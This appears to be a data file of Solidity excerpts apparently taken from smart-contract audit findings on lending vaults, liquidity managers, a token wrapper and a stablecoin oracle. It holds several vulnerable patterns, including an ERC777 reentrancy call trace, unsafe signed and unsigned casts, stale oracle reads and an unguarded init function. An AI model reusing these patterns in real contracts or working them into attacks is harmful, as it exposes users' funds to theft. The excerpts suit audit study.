Errors.VL_NOT_AUTHORIZED);\n}\n```"
"```\nfunction univTransfer(\n    IERC20 token,\n    address payable to,\n    uint256 amount\n) internal {\n    if (amount > 0) {\n        if (isFTM(token)) {\n            (bool sent, ) = to.call{ value: amount }("""");\n            require(sent, ""Failed to send Ether"");\n        } else {\n            token.safeTransfer(to, amount);\n        }\n    }\n}\n```\n```\n/**\n * @dev Paybacks the underlying asset and withdraws collateral in a single function call from activeProvider\n * @param _paybackAmount: amount of underlying asset to be payback, pass -1 to pay full amount\n * @param _collateralAmount: amount of collateral to be withdrawn, pass -1 to withdraw maximum amount\n */\nfunction paybackAndWithdraw(int256 _paybackAmount, int256 _collateralAmount) external payable {\n    updateF1155Balances();\n    _internalPayback(_paybackAmount);\n    _internalWithdraw(_collateralAmount);\n}\n```\n```\n/**\n * @dev Paybacks Vault's type underlying to activeProvider - called by users\n * @param _repayAmount: token amount of underlying to repay, or\n * pass any 'negative number' to repay full amount\n * Emits a {Repay} event.\n */\nfunction payback(int256 _repayAmount) public payable override {\n    updateF1155Balances();\n    _internalPayback(_repayAmount);\n}\n```\n```\n/**\n * @dev Deposits collateral and borrows underlying in a single function call from activeProvider\n * @param _collateralAmount: amount to be deposited\n * @param _borrowAmount: amount to be borrowed\n */\nfunction depositAndBorrow(uint256 _collateralAmount, uint256 _borrowAmount) external payable {\n    updateF1155Balances();\n    _internalDeposit(_collateralAmount);\n    _internalBorrow(_borrowAmount);\n}\n```\n```\n/**\n * @dev Borrows Vault's type underlying amount from activeProvider\n * @param _borrowAmount: token amount of underlying to borrow\n * Emits a {Borrow} event.\n */\nfunction borrow(uint256 _borrowAmount) public override nonReentrant {\n    updateF1155Balances();\n    _internalBorrow(_borrowAmount);\n}\n```\n```\ndepositAndBorrow\nupdateBalances\ninternalDeposit ->\n    ERC777(collateralAsset).safeTransferFrom()  # calls back!\n    callback:beforeTokenTransfer\n   !! depositAndBorrow\n    updateBalances\n    internalDeposit\n    --> ERC777.safeTransferFrom()\n    <--\n_deposit\nmint\ninternalBorrow\nmint\n_borrow\nERC777(borrowAsset).univTransfer(msg.sender)  # might call back\n\n<-------------------------------\n_deposit\nmint\ninternalBorrow\nmint\n_borrow\n--> ERC777(borrowAsset).univTransfer(msg.sender)  # might call back\n<--\n```"
"```\nfunction repayBorrow(uint256 repayAmount) external returns (uint256) {\n}\n```\nfunction repayBorrowInternal(uint repayAmount) internal nonReentrant returns (uint, uint) {\n    uint error = accrueInterest();\n    if (error!= uint(Error.NO_ERROR)) {\n        return (fail(Error(error), FailureInfo.REPAY_BORROW_ACCRUE_INTEREST_FAILED), 0);\n    }\n    return repayBorrowFresh(msg.sender, msg.sender, repayAmount);\n}\n```\n```\nif (allowed!= 0) {\n    return (failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.REPAY_BORROW_COMPTROLLER_REJECTION, allowed), 0);\n}\n\nif (accrualBlockNumber!= getBlockNumber()) {\n    return (fail(Error.MARKET_NOT_FRESH, FailureInfo.REPAY_BORROW_FRESHNESS_CHECK), 0);\n}\n\nRepayBorrowLocalVars memory vars;\n\nvars.borrowerIndex = accountBorrows[borrower].interestIndex;\n\n(vars.mathErr, vars.accountBorrows) = borrowBalanceStoredInternal(borrower);\nif (vars.mathErr!= MathError.NO_ERROR) {\n    return (failOpaque(Error.MATH_ERROR, FailureInfo.REPAY_BORROW_ACCUMULATED_BALANCE_CALCULATION_FAILED, uint(vars.mathErr)), 0);\n}\n```\n```\nrequire(erc20token.balanceOf(address(this)) >= _amount, ""Not-enough-token"");\nerc20token.univApprove(address(cyTokenAddr), _amount);\ncyToken.repayBorrow(_amount);\n```\n```\nrequire(\n    erc20token.balanceOf(address(this)) >= _amount,\n    ""Not-enough-token""\n);\nerc20token.univApprove(address(cyTokenAddr), _amount);\ncyToken.repayBorrow(_amount);\n```\n```\nif (_isETH(_asset)) {\n    ICEth cToken = ICEth(cTokenAddr);\n    cToken.repayBorrow{ value: msg.value }();\n} else {\n    IERC20 erc20token = IERC20(_asset);\n    ICErc20 cToken = ICErc20(cTokenAddr);\n    require(erc20token.balanceOf(address(this)) >= _amount, ""Not-enough-token"");\n    erc20token.univApprove(address(cTokenAddr), _amount);\n    cToken.repayBorrow(_amount);\n}\n```"
"```\nif (amountOwed!= 0) {\n    return fail(Error.NONZERO_BORROW_BALANCE, FailureInfo.EXIT_MARKET_BALANCE_OWED);\n}\n\nif (allowed!= 0) {\n    return failOpaque(Error.REJECTION, FailureInfo.EXIT_MARKET_REJECTION, allowed);\n}\n```\n```\n/**\n * @notice Removes asset from sender's account liquidity calculation\n * @dev Sender must not have an outstanding borrow balance in the asset,\n * or be providing necessary collateral for an outstanding borrow.\n * @param cTokenAddress The address of the asset to be removed\n * @return Whether or not the account successfully exited the market\n */\nfunction exitMarket(address cTokenAddress) external returns (uint) {\n    CToken cToken = CToken(cTokenAddress);\n\n    // Get sender tokensHeld and amountOwed underlying from the cToken\n    (uint oErr, uint tokensHeld, uint amountOwed, ) = cToken.getAccountSnapshot(msg.sender);\n    require(oErr == 0, ""exitMarket: getAccountSnapshot failed""); // semi-opaque error code\n\n    // Fail if the sender has a borrow balance\n    if (amountOwed!= 0) {\n        return fail(Error.NONZERO_BORROW_BALANCE, FailureInfo.EXIT_MARKET_BALANCE_OWED);\n    }\n\n    // Fail if the sender is not permitted to redeem all of their tokens\n    uint allowed = redeemAllowedInternal(cTokenAddress, msg.sender, tokensHeld);\n    if (allowed!= 0) {\n        return failOpaque(Error.REJECTION, FailureInfo.EXIT_MARKET_REJECTION, allowed);\n    }\n```\n```\nfunction _exitCollatMarket(address _cyTokenAddress) internal {\n    IComptroller comptroller = IComptroller(_getComptrollerAddress());\n    comptroller.exitMarket(_cyTokenAddress);\n}\n```\n```\nfunction _exitCollatMarket(address _cyTokenAddress) internal {\n    IComptroller comptroller = IComptroller(_getComptrollerAddress());\n    comptroller.exitMarket(_cyTokenAddress);\n}\n```\n```\nfunction _exitCollatMarket(address _cTokenAddress) internal {\n    IComptroller comptroller = IComptroller(_getComptrollerAddress());\n    comptroller.exitMarket(_cTokenAddress);\n}\n```\n```\nfunction _exitCollatMarket(address _cyTokenAddress) internal {\n    IComptroller comptroller = IComptroller(_getComptrollerAddress());\n    comptroller.exitMarket(_cyTokenAddress);\n}\n```\n```\nfunction _enterCollatMarket(address _cyTokenAddress) internal {\n    IComptroller comptroller = IComptroller(_getComptrollerAddress());\n\n    address[] memory cyTokenMarkets = new address[](1);\n    cyTokenMarkets[0] = _cyTokenAddress;\n    comptroller.enterMarkets(cyTokenMarkets);\n}"
"```\nif (vAssets.borrowAsset == FTM) {\n    require(msg.value >= debtTotal, Errors.VL_AMOUNT_ERROR);\n} else {\n```"
"```\nsolidity-shell\n\n🚀 Entering interactive Solidity ^0.8.11 shell. '.help' and '.exit' are your friends.\n» ganache-mgr: starting temp. ganache instance\n» uint(int(-100))\n115792089237316195423570985008687907853269984665640564039457584007913129639836\n» int256(uint(2**256-100))\n-100\n```\n```\nuint256 collateralInPlay = _getCollateralInPlay(\n    vAssets.collateralAsset,\n    vAssets.borrowAsset,\n    debtTotal + bonus\n);\n\n_burnMulti(addrs, borrowBals, vAssets, _vault, f1155);\n\nIVault(_vault).withdrawLiq(int256(collateralInPlay));\n```\n```\nuint256 collateralInPlay = _getCollateralInPlay(\n    vAssets.collateralAsset,\n    vAssets.borrowAsset,\n    _amount + _flashloanFee + bonus\n);\n\n_burnMulti(_addrs, _borrowBals, vAssets, _vault, f1155);\n\nIVault(_vault).withdrawLiq(int256(collateralInPlay));\n```\n```\nuint256 amount = _amount < 0? debtTotal : uint256(_amount);\n```\n```\nfunction withdrawLiq(uint256 _withdrawAmount) external override nonReentrant onlyFliquidator {\n    _withdraw(_withdrawAmount, address(activeProvider));\n    IERC20Upgradeable(vAssets.collateralAsset).transfer(\n        payable(msg.sender),\n        uint256(_withdrawAmount)\n    );\n}\n```\n```\nfunction updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit {\n    uint256 total = totalSupply(_assetID);\n    if (newBalance > 0 && total > 0 && newBalance > total) {\n        uint256 newIndex = (indexes[_assetID] * newBalance) / total;\n        indexes[_assetID] = uint128(newIndex);\n    }\n}\n```"
"```\nfunction setFlashCloseFee(uint64 _newFactorA, uint64 _newFactorB) external isAuthorized {\n    flashCloseF.a = _newFactorA;\n    flashCloseF.b = _newFactorB;\n}\n```"
"```\nfunction withdraw(int256 _withdrawAmount) public override nonReentrant {\n    updateF1155Balances();\n    _internalWithdraw(_withdrawAmount);\n}\n```\n```\nuint256 amountToWithdraw = _withdrawAmount < 0\n   ? providedCollateral - neededCollateral\n    : uint256(_withdrawAmount);\n```\n```\nfunction withdrawLiq(uint256 _withdrawAmount) external override nonReentrant onlyFliquidator {\n    _withdraw(_withdrawAmount, address(activeProvider));\n    IERC20Upgradeable(vAssets.collateralAsset).transfer(\n        payable(msg.sender),\n        uint256(_withdrawAmount)\n    );\n}\n```"
"```\nfunction _getAaveProvider() internal pure returns (IAaveLendingPoolProvider) {\n    return IAaveLendingPoolProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5);\n}\n```\npragma solidity ^0.8.0;\n\ninterface IAaveLendingPool {\n    function flashLoan(\n        address receiverAddress,\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata modes,\n        address onBehalfOf,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n\n    function deposit(\n        address _asset,\n        uint256 _amount,\n        address _onBehalfOf,\n        uint16 _referralCode\n    ) external;\n\n    function withdraw(\n        address _asset,\n        uint256 _amount,\n        address _to\n    ) external;\n\n    function borrow(\n        address _asset,\n        uint256 _amount,\n        uint256 _interestRateMode,\n        uint16 _referralCode,\n        address _onBehalfOf\n    ) external;\n\n    function repay(\n        address _asset,\n        uint256 _amount,\n        uint256 _rateMode,\n        address _onBehalfOf\n    ) external;\n\n    function setUserUseReserveAsCollateral(address _asset, bool _useAsCollateral) external;\n}\n```\n```\nif (amount == type(uint256).max) {\n    amountToWithdraw = userBalance;\n}\nreturn amountToWithdraw;\n```\nfunction withdraw(address _asset, uint256 _amount) external payable override {\n    IAaveLendingPool aave = IAaveLendingPool(_getAaveProvider().getLendingPool());\n\n    bool isFtm = _asset == _getFtmAddr();\n    address _tokenAddr = isFtm? _getWftmAddr() : _asset;\n\n    aave.withdraw(_tokenAddr, _amount, address(this));\n\n    // convert WFTM to FTM\n    if (isFtm) {\n        address unwrapper = _getUnwrapper();\n        IERC20(_tokenAddr).univTransfer(payable(unwrapper), _amount);\n        IUnwrapper(unwrapper).withdraw(_amount);\n    }\n}\n```"
"```\ntransaction.data = abi.encodeWithSelector(\n    IUniswapV2Router01.swapExactETHForTokens.selector,\n    0,\n    path,\n    msg.sender,\n    type(uint256).max\n)\n```\n```\n(success, ) = swapTransaction.to.call(value: swapTransaction.value)(swapTransaction.data)\nrequire(success, ""failed to swap rewards"")\n```"
"```\n/**\n * @dev Calculates the USD price of asset.\n * @param _asset: the asset address.\n * Returns the USD price of the given asset\n */\nfunction _getUSDPrice(address _asset) internal view returns (uint256 price) {\n    require(usdPriceFeeds[_asset]!= address(0), Errors.ORACLE_NONE_PRICE_FEED);\n\n    (, int256 latestPrice,,, ) = AggregatorV3Interface(usdPriceFeeds[_asset]).latestRoundData();\n\n    price = uint256(latestPrice);\n}\n```\n```\n@return updatedAt is the timestamp when the round last was updated (i.e. answer was last computed)\n```"
"```\nfunction initialize(\n    address _fujiadmin,\n    address _oracle,\n    address _collateralAsset,\n    address _borrowAsset\n) external initializer {\n```\n```\n""deployer"": ""0xb98d4D4e205aff4d4755e9df19bd0b8bd4e0f148"",\n```\n{\n    ""FujiAdmin"": {\n        ""address"": ""0xaAb2AAfBFf7419Ff85181d3A846bA9045803dd67"",\n        ""deployer"": ""0xb98d4D4e205afF4d4755E9Df19BD0B8BD4e0f148"",\n        ""abi"": [\n            {\n                ""anonymous"": false,\n```"
"```\ncontract WFTMUnwrapper {\n    address constant wftm = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;\n\n    receive() external payable {}\n\n    function withdraw(uint256 _amount) external {\n        IWETH(wftm).withdraw(_amount);\n        (bool sent, ) = msg.sender.call{ value: _amount }("""");\n        require(sent, ""Failed to send FTM"");\n    }\n}\n```\nif (isFtm) {\n    IWETH(_tokenAddr).deposit{ value: _amount }();\n}\n```"
"```\nfunction callFunction(\n    address sender,\n    Account.Info calldata account,\n    bytes calldata data\n) external override {\n    require(msg.sender == _dydxSoloMargin && sender == address(this), Errors.VL_NOT_AUTHORIZED);\n\n    account;\n\n    FlashLoan.Info memory info = abi.decode(data, (FlashLoan.Info));\n\n    uint256 _value;\n    if (info.asset == _ETH) {\n        _convertWethToEth(info.amount);\n        _value = info.amount;\n    } else {\n        IERC20(info.asset).univTransfer(payable(info.vault), info.amount);\n    }\n```\n```\nlibrary LibUniversalERC20 {\n    using SafeERC20 for IERC20;\n\n    IERC20 private constant _ETH_ADDRESS = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n    IERC20 private constant _ZERO_ADDRESS = IERC20(0x0000000000000000000000000000000000000000);\n\n    function isETH(IERC20 token) internal pure returns (bool) {\n        return (token == _ZERO_ADDRESS || token == _ETH_ADDRESS);\n    }\n}\n```\nfunction univTransfer(\n    IERC20 token,\n    address payable to,\n    uint256 amount\n) internal {\n    if (amount > 0) {\n        if (isETH(token)) {\n            (bool sent, ) = to.call{ value: amount }("""");\n            require(sent, ""Failed to send Ether"");\n        } else {\n            token.safeTransfer(to, amount);\n        }\n    }\n}\n```\n```\nuint256 _value = vAssets.borrowAsset == ETH? debtTotal : 0;\n```"
"```\n/**\n * @dev Sets '_priceFeed' address for a '_asset'.\n * Can only be called by the contract owner.\n * Emits a {AssetPriceFeedChanged} event.\n */\nfunction setPriceFeed(address _asset, address _priceFeed) public onlyOwner {\n    require(_priceFeed!= address(0), Errors.VL_ZERO_ADDR);\n    usdPriceFeeds[_asset] = _priceFeed;\n    emit AssetPriceFeedChanged(_asset, _priceFeed);\n}\n```"
"```\nrouter = ISwapRouter(_router);\n\nuint256 amountOut;\nuint256 swap;\n\nif (swapAmount < 0) {\n    swap = uint256(swapAmount * -1);\n    IHypervisor(pos).token1().transferFrom(msg.sender, address(this), deposit1 + swap);\n    amountOut = router.exactInput(\n        ISwapRouter.ExactInputParams(\n            path,\n            address(this),\n            block.timestamp + swapLife,\n            swap,\n            deposit0\n        )\n    );\n} else {\n    swap = uint256(swapAmount);\n    IHypervisor(pos).token0().transferFrom(msg.sender, address(this), deposit0 + swap);\n    amountOut = router.exactInput(\n        ISwapRouter.ExactInputParams(\n            path,\n            address(this),\n            block.timestamp + swapLife,\n            swap,\n            deposit1\n        )\n    );\n}\n```"
"```\nfunction depositSwap(\n    int256 swapAmount,  // (-) token1, (+) token0 for token1; amount to swap\n    uint256 deposit0,\n    uint256 deposit1,\n    address to,\n    address from,\n    bytes memory path,\n    address pos,\n    address _router\n) external returns (uint256 shares) {\n```"
"```\nif (twapCheck || positions[pos].twapOverride):\n    checkPriceChange(\n        pos,\n        positions[pos].twapOverride and positions[pos].twapInterval or twapInterval,\n        positions[pos].twapOverride and positions[pos].priceThreshold or priceThreshold\n    )\n```"
"```\nfunction properDepositRatio(\n  address pos,\n  uint256 deposit0,\n  uint256 deposit1\n) public view returns (bool) {\n    (uint256 hype0, uint256 hype1) = IHypervisor(pos).getTotalAmounts();\n    if (IHypervisor(pos).totalSupply()!= 0) {\n        uint256 depositRatio = deposit0 == 0? 10e18 : deposit1.mul(1e18).div(deposit0);\n        depositRatio = depositRatio > 10e18? 10e18 : depositRatio;\n        depositRatio = depositRatio < 10e16? 10e16 : depositRatio;\n        uint256 hypeRatio = hype0 == 0? 10e18 : hype1.mul(1e18).div(hype0);\n        hypeRatio = hypeRatio > 10e18? 10e18 : hypeRatio;\n        hypeRatio = hypeRatio < 10e16? 10e16 : hypeRatio;\n        return (FullMath.mulDiv(depositRatio, deltaScale, hypeRatio) < depositDelta &&\n                FullMath.mulDiv(hypeRatio, deltaScale, depositRatio) < depositDelta);\n    }\n    return true;\n}\n```"
"```\nelse:\n    swap = uint256(swapAmount)\n    IHypervisor(pos).token0().transferFrom(msg.sender, address(this), deposit0 + swap)\n\n    amountOut = router.exactInput(\n        ISwapRouter.ExactInputParams(\n            path,\n            address(this),\n            block.timestamp + swapLife,\n            swap,\n            deposit1\n        )\n    )\n\nrequire(amountOut > 0, ""Swap failed"")\n\nif positions[pos].version < 2:\n    shares = IHypervisor(pos).deposit(deposit0, deposit1, address(this))\n    IHypervisor(pos).transfer(to, shares)\n```"
"```\nif (swapQuantity!= 0) {\n    pool.swap(\n        address(this),\n        swapQuantity > 0,\n        swapQuantity > 0? swapQuantity : -swapQuantity,\n        swapQuantity > 0? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,\n        abi.encode(address(this))\n    );\n}\n```\n```\nfunction _mintLiquidity(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 liquidity,\n    address payer\n) internal returns (uint256 amount0, uint256 amount1) {\n    if (liquidity > 0) {\n        (amount0, amount1) = pool.mint(\n            address(this),\n            tickLower,\n            tickUpper,\n            liquidity,\n            abi.encode(payer)\n        );\n    }\n}\n```\n```\nfunction _burnLiquidity(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 liquidity,\n    address to,\n    bool collectAll\n) internal returns (uint256 amount0, uint256 amount1) {\n    if (liquidity > 0) {\n        (uint256 owed0, uint256 owed1) = pool.burn(tickLower, tickUpper, liquidity);\n\n        uint128 collect0 = collectAll? type(uint128).max : _uint128Safe(owed0);\n        uint128 collect1 = collectAll? type(uint128).max : _uint128Safe(owed1);\n        if (collect0 > 0 || collect1 > 0) {\n            (amount0, amount1) = pool.collect(to, tickLower, tickUpper, collect0, collect1);\n        }\n    }\n}"
"```\nfunction uniswapV3MintCallback(\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n) external override {\n    require(msg.sender == address(pool));\n    address payer = abi.decode(data, (address));\n\n    if (payer == address(this)) {\n        if (amount0 > 0) {\n            token0.safeTransfer(msg.sender, amount0);\n        }\n        if (amount1 > 0) {\n            token1.safeTransfer(msg.sender, amount1);\n        }\n    } else {\n        if (amount0 > 0) {\n            token0.safeTransferFrom(payer, msg.sender, amount0);\n        }\n        if (amount1 > 0) {\n            token1.safeTransferFrom(payer, msg.sender, amount1);\n        }\n    }\n}\n\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external override {\n    require(msg.sender == address(pool));\n    address payer = abi.decode(data, (address));\n\n    if (amount0Delta > 0) {\n        if (payer == address(this)) {\n            token0.safeTransfer(msg.sender, uint256(amount0Delta));\n        } else {\n            token0.safeTransferFrom(payer, msg.sender, uint256(amount0Delta));\n        }\n    } else if (amount1Delta > 0) {\n        if (payer == address(this)) {\n            token1.safeTransfer(msg.sender, uint256(amount1Delta));\n        } else {\n            token1.safeTransferFrom(payer, msg.sender, uint256(amount1Delta));\n        }\n    }\n}"
"```\nelse:\n    swap = uint256(swapAmount)\n    IHypervisor(pos).token0().transferFrom(msg.sender, address(this), deposit0 + swap)\n\n    amountOut = router.exactInput(\n        ISwapRouter.ExactInputParams(\n            path,\n            address(this),\n            block.timestamp + swapLife,\n            swap,\n            deposit1\n        )\n    )\n\nrequire(amountOut > 0, ""Swap failed"")\n\nif positions[pos].version < 2:\n    shares = IHypervisor(pos).deposit(deposit0, deposit1, address(this))\n    IHypervisor(pos).transfer(to, shares)\n```"
"```\nfunction __ERC20WrapperGluwacoin_init(\n    string memory name,\n    string memory symbol,\n    IERC20 token\n) internal initializer {\n    __Context_init_unchained();\n    __ERC20_init_unchained(name, symbol);\n    __ERC20ETHless_init_unchained();\n    __ERC20Reservable_init_unchained();\n    __AccessControlEnumerable_init_unchained();\n    __ERC20Wrapper_init_unchained(token);\n    __ERC20WrapperGluwacoin_init_unchained();\n}\n```\n```\nERC20WrapperGluwacoin\n  ERC20Reservable\n  ERC20ETHless\n  ERC20Wrapper\n  ERC20Upgradeable\n  IERC20MetadataUpgradeable\n  IERC20Upgradeable\n  AccessControlEnumerableUpgradeable\n  AccessControlUpgradeable\n  ERC165Upgradeable\n  IERC165Upgradeable\n  IAccessControlEnumerableUpgradeable\n  IAccessControlUpgradeable\n  ContextUpgradeable\n  Initializable\n```"
"```\nfunction _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256 amount\n) internal override(ERC20Upgradeable, ERC20Wrapper, ERC20Reservable) {\n    ERC20Wrapper._beforeTokenTransfer(from, to, amount);\n    ERC20Reservable._beforeTokenTransfer(from, to, amount);\n}\n```\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {\n    if (from!= address(0)) {\n        require(_unreservedBalance(from) >= amount, ""ERC20Reservable: transfer amount exceeds unreserved balance"");\n    }\n\n    super._beforeTokenTransfer(from, to, amount);\n}\n```\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {\n    super._beforeTokenTransfer(from, to, amount);\n}\n```\n```\nERC20WrapperGluwacoin\n  ERC20Reservable\n  ERC20ETHless\n  ERC20Wrapper\n  ERC20Upgradeable\n  IERC20MetadataUpgradeable\n  IERC20Upgradeable\n  AccessControlEnumerableUpgradeable\n  AccessControlUpgradeable\n  ERC165Upgradeable\n  IERC165Upgradeable\n  IAccessControlEnumerableUpgradeable\n  IAccessControlUpgradeable\n  ContextUpgradeable\n  Initializable\n```"
```\nfunction decimals() public pure override returns (uint8) {\n    return 6;\n}\n```
```\nuint256 bptTotal = pool.totalSupply();\nuint256 bptBalance = pool.balanceOf(address(this));\n\nif (bptTotal == 0) {\n    _initializePool();\n    return;\n}\n```
"```\nfunction _getTokensIn(uint256 spentTokenBalance) internal view returns (uint256[] memory amountsIn) {\n    amountsIn = new uint256[](2);\n\n    uint256 receivedTokenBalance = readOracle().mul(spentTokenBalance).mul(ONE_PERCENT).div(NINETY_NINE_PERCENT).asUint256();\n\n    if (address(assets[0]) == tokenSpent) {\n        amountsIn[0] = spentTokenBalance;\n        amountsIn[1] = receivedTokenBalance;\n    } else {\n        amountsIn[0] = receivedTokenBalance;\n        amountsIn[1] = spentTokenBalance;\n    }\n}\n```\n```\nIERC20(tokenReceived).transfer(\n    tokenReceivingAddress,\n    IERC20(tokenReceived).balanceOf(address(this))\n)"
"```\n(uint256 _3crvAmount, uint256 _feiAmount) = (\n    IStableSwap2(pool).balances(_3crvIndex),\n    IStableSwap2(pool).balances(_feiIndex)\n);\n\nuint256 _3crvAmountAfter = _3crvAmount + _3crvBalanceAfter;\n\nuint256 _3crvUsdValue = _3crvAmountAfter * IStableSwap3(_3pool).get_virtual_price() / 1e18;\n\nuint256 _feiToDeposit = 0;\nif (_3crvUsdValue > _feiAmount) {\n    _feiToDeposit = _3crvUsdValue - _feiAmount;\n}\n```\n```\nuint256[2] memory _minAmounts; // [0, 0]\n\nIERC20(pool).approve(pool, _lpToWithdraw);\n\nuint256 _3crvBalanceBefore = IERC20(_3crv).balanceOf(address(this));\n\nIStableSwap2(pool).remove_liquidity(_lpToWithdraw, _minAmounts);\n```\n```\nresistantBalance = _lpPriceUSD / 2;\nresistantFei = resistantBalance;\n```"
"```\nfunction pcvStats() public override view returns (\n  uint256 protocolControlledValue,\n  uint256 userCirculatingFei,\n  int256 protocolEquity,\n  bool validityStatus\n) {\n    uint256 _protocolControlledFei = 0;\n    validityStatus =!paused();\n\n    for (uint256 i = 0; i < tokensInPcv.length(); i++) {\n        address _token = tokensInPcv.at(i);\n        uint256 _totalTokenBalance = 0;\n\n        for (uint256 j = 0; j < tokenToDeposits[_token].length(); j++) {\n            address _deposit = tokenToDeposits[_token].at(j);\n\n            if (!excludedDeposits[_deposit]) {\n                (uint256 _depositBalance, uint256 _depositFei) = IPCVDepositBalances(_deposit).resistantBalanceAndFei();\n                _totalTokenBalance += _depositBalance;\n                _protocolControlledFei += _depositFei;\n            }\n        }\n\n        if (_totalTokenBalance!= 0) {\n            (Decimal.D256 memory _oraclePrice, bool _oracleValid) = IOracle(tokenToOracle[_token]).read();\n            if (!_oracleValid) {\n                validityStatus = false;\n            }\n            protocolControlledValue += _oraclePrice.mul(_totalTokenBalance).asUint256();\n        }\n    }\n\n    userCirculatingFei = fei().totalSupply() - _protocolControlledFei;\n    protocolEquity = int256(protocolControlledValue) - int256(userCirculatingFei);\n}\n```"
"```\nfunction init(IWeightedPool _pool) external {\n    require(address(_pool) == address(0), ""BalancerLBPSwapper: initialized"");\n\n    pool = _pool;\n    IVault _vault = _pool.getVault();\n\n    vault = _vault;\n\n    require(_pool.getOwner() == address(this), ""BalancerLBPSwapper: contract not pool owner"");\n```\n```\nIERC20(tokenSpent).approve(address(_vault), type(uint256).max);\nIERC20(tokenReceived).approve(address(_vault), type(uint256).max);\n```"
"```\nfunction _afterMint() internal override {\n    IPCVSwapper(target).swap();\n}\n```\n```\nfunction swap() external override afterTime whenNotPaused {\n    (\n        uint256 spentReserves,\n        uint256 receivedReserves,\n        uint256 lastChangeBlock\n    ) = getReserves();\n\n    require(lastChangeBlock < block.number, ""BalancerLBPSwapper: pool changed this block"");\n}"
"```\nrequire(_validityStatus, ""CollateralizationOracleWrapper: CollateralizationOracle is invalid"");\n\ncachedProtocolControlledValue = _protocolControlledValue;\ncachedUserCirculatingFei = _userCirculatingFei;\ncachedProtocolEquity = _protocolEquity;\n\n_initTimed();\n\nemit CachedValueUpdate(\n    msg.sender,\n    cachedProtocolControlledValue,\n    cachedUserCirculatingFei,\n    cachedProtocolEquity\n);\n\nreturn outdated\n    || _isExceededDeviationThreshold(cachedProtocolControlledValue, _protocolControlledValue)\n    || _isExceededDeviationThreshold(cachedUserCirculatingFei, _userCirculatingFei);\n```"
"```\nfunction read() external view override returns (Decimal.D256 memory, bool) {\n    (uint80 roundId, int256 price,,, uint80 answeredInRound) = chainlinkOracle.latestRoundData();\n    bool valid =!paused() && price > 0 && answeredInRound == roundId;\n\n    Decimal.D256 memory value = Decimal.from(uint256(price)).div(oracleDecimalsNormalizer);\n    return (value, valid);\n}\n```\n```\nfunction isOutdated() external view override returns (bool) {\n    (uint80 roundId,,,, uint80 answeredInRound) = chainlinkOracle.latestRoundData();\n    return answeredInRound!= roundId;\n}\n```"
"```\nfunction setDepositExclusion(address _deposit, bool _excluded) external onlyGuardianOrGovernor {\n    excludedDeposits[_deposit] = _excluded;\n}\n```\n```\nevent DepositAdd(\n    address from,\n    address indexed deposit,\n    address indexed token\n);\n\nevent DepositRemove(\n    address from,\n    address indexed deposit\n)"
```\n_bufferStored = _bufferCap;\n```
```\ntokenSpent = _tokenSpent;\ntokenReceived = _tokenReceived;\n```\n```\naddress public override tokenSpent;\n\naddress public override tokenReceived;\n```
```\n// solidity 0.8.7\n\nint(uint(2**255))\n-57896044618658097711785492504343953926634992332820282019728792003956564819968\n\nint(uint(2**255-2))\n57896044618658097711785492504343953926634992332820282019728792003956564819966\n```\n```\nprotocol_equity = int256(protocol_controlled_value) - int256(user_circulating_fei)\n```\n```\nprotocolControlledValue += _oraclePrice.mul(_totalTokenBalance).asUint256()\n```
"```\nconstructor(\n    address _core,\n    address _target,\n    uint256 _incentive,\n    uint256 _frequency,\n    uint256 _initialMintAmount\n)\n    CoreRef(_core)\n    Timed(_frequency)\n    Incentivized(_incentive)\n    RateLimitedMinter(((_initialMintAmount + _incentive) / _frequency, (_initialMintAmount + _incentive), true)\n{\n    _initTimed();\n\n    _setTarget(_target);\n    _setMintAmount(_initialMintAmount);\n}\n```\n```\nfunction setFrequency(uint256 newFrequency) external override onlyGovernorOrAdmin {\n    require(newFrequency >= MIN_MINT_FREQUENCY, ""FeiTimedMinter: frequency low"");\n    require(newFrequency <= MAX_MINT_FREQUENCY, ""FeiTimedMinter: frequency high"");\n\n    _setDuration(newFrequency);\n}\n```"
"```\nfunction swapDeposit(address _oldDeposit, address _newDeposit) external onlyGovernor {\n    removeDeposit(_oldDeposit);\n    addDeposit(_newDeposit);\n}\n```"
"```\nfunction isOvercollateralized() external override view whenNotPaused returns (bool) {\n    (, int256 _protocolEquity, bool _valid) = pcvStats();\n    require(_valid, ""CollateralizationOracle: reading is invalid"");\n    return _protocolEquity > 0;\n}\n```\n```\n/// @return protocolEquity: the difference between PCV and user circulating FEI.\n/// If there are more circulating FEI than $ in the PCV, equity is 0.\n```\n```\nprotocol_equity = int256(protocol_controlled_value) - int256(user_circulating_fei)\n```"
"```\nfunction withdrawUnstakedTokens(address staker)\n    public\n    virtual\n    override\n    whenNotPaused {\n    require(staker == _msgSender(), ""LQ20"");\n\n    uint256 _withdrawBalance;\n    uint256 _unstakingExpirationLength = _unstakingExpiration[staker].length;\n    uint256 _counter = _withdrawCounters[staker];\n\n    for (uint256 i = _counter; i < _unstakingExpirationLength; i = i.add(1)) {\n        (uint256 _getUnstakeTime,, ) = getUnstakeTime(_unstakingExpiration[staker][i]);\n        if (block.timestamp >= _getUnstakeTime) {\n            _withdrawBalance = _withdrawBalance.add(_unstakingAmount[staker][i]);\n            _unstakingExpiration[staker][i] = 0;\n            _unstakingAmount[staker][i] = 0;\n            _withdrawCounters[staker] = _withdrawCounters[staker].add(1);\n        }\n    }\n\n    require(_withdrawBalance > 0, ""LQ21"");\n    emit WithdrawUnstakeTokens(staker, _withdrawBalance, block.timestamp);\n    _uTokens.mint(staker, _withdrawBalance);\n}\n```"
